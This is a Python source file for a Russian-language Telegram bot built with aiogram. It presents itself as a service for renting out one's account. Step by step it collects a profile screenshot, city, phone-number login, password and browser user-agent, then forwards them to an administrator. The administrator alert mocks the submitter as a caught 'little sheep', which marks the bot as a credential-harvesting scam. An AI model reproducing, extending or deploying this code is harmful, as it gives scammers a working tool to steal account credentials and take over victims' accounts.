from aiogram import Router, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from config import ADMIN_ID
from info.info import Info

router = Router()


class RentProcess(StatesGroup):
    rules_confirmation = State()
    account_age = State()
    notifications_on = State()
    send_screenshot = State()
    send_login = State()
    send_password = State()
    send_city = State()
    send_user_agent = State()


rules_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📜 Правила"), KeyboardButton(text="✅ Ознакомлен")]],
    resize_keyboard=True
)

account_age_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="✅ Да"), KeyboardButton(text="❌ Нет")]],
    resize_keyboard=True
)

notification_on = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text='✅ Уведомления включены')]],
    resize_keyboard=True
)


@router.message(F.text == "❗ Сдать аккаунт в аренду ❗")
async def ask_rules(message: types.Message, state: FSMContext):
    await message.answer("<b>Вы ознакомлены с правилами аренды?</b>",
                         reply_markup=rules_keyboard,
                         parse_mode='HTML')
    await state.set_state(RentProcess.rules_confirmation)


@router.message(lambda msg: msg.text == "📜 Правила")
async def rules_info(message: types.Message):
    await message.answer(Info.rules)


@router.message(RentProcess.account_age, F.text == "❌ Нет")
async def reject_account(message: types.Message, state: FSMContext):
    await message.answer("<b>Ваш аккаунт не соответствует требованиям. \nЧтобы обновить бота напишите /start</b>",
                         reply_markup=types.ReplyKeyboardRemove(),
                         parse_mode='HTML')
    await state.clear()


@router.message(RentProcess.rules_confirmation, F.text == "✅ Ознакомлен")
async def ask_account_age(message: types.Message, state: FSMContext):
    await message.answer("<b>Вашему аккаунту есть 30 дней с момента регистрации?</b>",
                         reply_markup=account_age_keyboard,
                         parse_mode='HTML')
    await state.set_state(RentProcess.account_age)


@router.message(RentProcess.account_age, F.text == "✅ Да")
async def ask_account_age(message: types.Message, state: FSMContext):
    await message.answer(Info.notification,
                         reply_markup=notification_on,
                         parse_mode='HTML')
    await state.set_state(RentProcess.notifications_on)


@router.message(RentProcess.notifications_on, F.text == '✅ Уведомления включены')
async def request_screenshot(message: types.Message, state: FSMContext):
    await message.answer_photo(photo=Info.image,
                               caption="<b>Отправьте скриншот профиля, как на примере. "
                                       "❗️Фото нужно отправлять картинкой, а не файлом.</b>",
                               parse_mode='HTML',
                               reply_markup=types.ReplyKeyboardRemove())
    await state.set_state(RentProcess.send_screenshot)


@router.message(RentProcess.send_screenshot, F.photo)
async def forward_screenshot(message: types.Message, state: FSMContext):
    await state.update_data(screenshot=message.photo[-1].file_id)
    await message.answer('<b>Какой город указан в вашем аккаунте?</b>'
                         '\n\nИнформация размещена в профиле в разделе "Адреса". '
                         '\n\nПример ответа: <b>Москва</b>',
                         parse_mode='HTML')
    await state.set_state(RentProcess.send_city)


@router.message(RentProcess.send_city)
async def receive_city(message: types.Message, state: FSMContext):
    await state.update_data(city=message.text)
    await message.answer("📞 <b>Отправьте логин от вашего аккаунта.</b> "
                         "\n\nЛогин - это номер телефона на который зарегистрирован аккаунт. "
                         "Убедитесь, что ввели правильный номер телефона перед отправкой."
                         "\n\n<b>Пример: 79999999999</b>",
                         parse_mode='HTML')
    await state.set_state(RentProcess.send_login)


@router.message(RentProcess.send_login, F.text.regexp(r"^7\d{10}$"))
async def receive_login(message: types.Message, state: FSMContext):
    await state.update_data(login=message.text)
    await message.answer(Info.password,
                         parse_mode='HTML')
    await state.set_state(RentProcess.send_password)


@router.message(RentProcess.send_login)
async def invalid_login(message: types.Message):
    await message.answer('❗️ Неправильный формат номера телефона ❗️'
                         '\n\nПроверьте, начинается ли телефон с цифры 7 и состоит из 11 цифр.'
                         '\n\n<b>Пример ответа: 79999999999</b>',
                         parse_mode="HTML")


@router.message(RentProcess.send_password)
async def receive_password(message: types.Message, state: FSMContext):
    await state.update_data(password=message.text)
    await message.answer(Info.user_agent,
                         parse_mode="HTML")
    await state.set_state(RentProcess.send_user_agent)


@router.message(RentProcess.send_user_agent)
async def receive_user_agent(message: types.Message, state: FSMContext, bot):
    user_data = await state.get_data()

    city = user_data.get("city")
    login = user_data.get("login")
    password = user_data.get("password")
    user_agent = message.text
    screenshot = user_data.get("screenshot")
    tg_username = message.from_user.username or None
    tg_id = str(message.from_user.id)

    admin_message = (
        f"📩 <b>О баранчика прижали!</b>\n\n"
        f"ТГ: @{tg_username}\n"
        f"ТГ id: @{tg_id}\n"
        f"🏙️ <b>Город:</b> {city}\n"
        f"📞 <b>Логин:</b> {login}\n"
        f"🔑 <b>Пароль:</b> {password}\n\n"
        f"🖥 <b>User-Agent:</b>\n{user_agent}"
    )

    await bot.send_photo(ADMIN_ID, screenshot, caption=admin_message, parse_mode="HTML")
    await message.answer("✅ Новая заявка создана! Оператор свяжется с вами в рабочее время.")
    await state.clear()
